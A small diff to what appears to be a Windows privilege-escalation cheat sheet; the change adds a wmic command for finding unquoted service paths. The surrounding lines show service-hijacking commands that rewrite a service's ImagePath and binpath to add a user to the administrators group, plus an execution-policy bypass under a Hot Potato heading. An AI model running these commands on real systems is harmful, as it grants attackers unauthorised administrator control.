@@ -16,7 +16,8 @@ Get-Acl-Path hklm\System\CurrentControlSet\Services\regsvc | fl ~ (NT Authority\
 reg add hklm\System\CurrentControlSet\Services\regsvc /v ImagePath /t REG_EXPAND_SZ /d <malicious_filename> /f  
 sc config regsvc binpath="net localgroup administrators <username> /add"
 sc start regsvc
-icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"  
+icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+wmic service get,name,displayname,pathname,startmode | findstr /v /i "C:\Windows" (Non-default Services / Special focus on PathNames not quoted)
 
 HOT POTATO  
 powershell.exe -nop -ep bypass  
